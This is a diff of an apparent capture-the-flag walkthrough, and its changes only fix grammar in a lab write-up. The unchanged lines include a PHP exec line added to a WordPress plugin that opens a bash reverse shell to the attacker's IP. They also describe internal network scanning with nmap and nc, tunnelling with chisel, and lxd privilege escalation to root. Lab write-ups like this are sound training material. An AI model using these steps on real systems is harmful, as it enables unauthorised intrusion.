@@ -26,7 +26,7 @@ Now scroll to the bottom and place the this code at the bottom
 `exec('/bin/bash -c "bash -i >& /dev/tcp/{YOUR VPN IP}/4444 0>&1"');`
 and update the file.
 
-Go back installed plugins and activate the plugin.
+Go back to installed plugins and activate the plugin.
 <br></br><img src='./img/Screenshot (120).png' /><br></br>
 and we will get back a shell.
 
@@ -40,7 +40,7 @@ Download the linpeas.sh in /tmp and make it executable with `chmod +x linpeas.sh
 In the scan we can see that there are different networks
 <br></br><img src='./img/Screenshot (122).png' /><br></br>
 We scan for ips that are up and running with the help of nmap, download the binary from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)
-After downloading move the binary to target machine with curl and run the following command to scan for IPs
+. After downloading move the binary to target machine with curl and run the following command to scan for IPs
 ##### ./nmap -sn 172.18.0.1/24 10.0.0.5/24
 This will give us a list of IPs that are up
 * 172.18.0.1
@@ -59,7 +59,7 @@ We can scan the IPs for open port with nc, download the binary [here](https://gi
 Run this command to look for ports
 ##### ./nc -zv {IP} {PORTS}
 
-Scan an ip for a common ports. We can see that only 172.18.0.1 has port 22 open. We can also see that ssh is not available for the reverse shell. So now we will use chisel, download he binary [here](https://github.com/jpillora/chisel/releases/tag/v1.7.6). Download the .gzip file and extract it to get the binary.
+Scan ips for common ports. We can see that only 172.18.0.1 has port 22 open. We can also see that ssh is not available for the reverse shell. So now we will use chisel, download he binary [here](https://github.com/jpillora/chisel/releases/tag/v1.7.6). Download the .gzip file and extract it to get the binary.
 We will use chisel for port forwarding, read more about it [here](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
 
 On the attacking machine i.e your own machine, run the following command
@@ -77,7 +77,7 @@ Enter the password and we get the shell as sysadmin
 ### FLAG2
 
 Now that we have the user, we can try for root.
-Running `id` command tells us that we are part of the lxd and running `lxc image list` we can list the images. We can use the `lxd privesc` to get the root.
+Running `id` command tells us that we are part of the lxd group and by running `lxc image list` we can list the images. We can use the `lxd privesc` to get the root.
 Read about the privesc [here](https://www.hackingarticles.in/lxd-privilege-escalation/)
 
 Run the following commands on your own machine i.e youe attacking machine
@@ -86,7 +86,7 @@ Run the following commands on your own machine i.e youe attacking machine
 ##### ./build-alpine
 *NOTE: If you face any problem with build-alpine then you can look for a solution [here](https://github.com/saghul/lxd-alpine-builder/issues/1)*
 
-Once you get the `tar.gz` file, move that file to the target machine with curl.
+Once you get the `.tar.gz` file, move that file to the target machine with curl.
 
 On the target machine run the following set of commands in the same directory as the `tar.gz` (not necessary though, you can specify the path in the commands too)
 
